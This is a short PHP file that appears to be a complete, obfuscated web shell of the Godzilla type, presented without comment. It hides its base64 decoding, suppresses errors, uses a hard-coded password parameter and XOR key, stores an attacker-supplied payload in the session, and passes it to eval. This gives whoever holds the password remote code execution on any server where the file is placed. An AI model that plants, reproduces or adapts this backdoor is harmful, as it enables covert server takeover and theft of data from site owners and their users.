<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++) {$c = $K[$i+1&15];$D[$i] = $D[$i]^$c;}return $D;}$payloadName='payload';$pass='rain_cistanche';$key='b3110145e0461860';if (isset($_POST[$pass])){$bs=preg_filter('/\s+/','','base 64 _ deco de');$p = $_POST[$pass];$data=encode($bs($p.""),$key);if (isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}class GH70y973{ public function __construct($payload) {@eval("/*Z86m634950*/".$payload."");}}new GH70y973($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if (strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}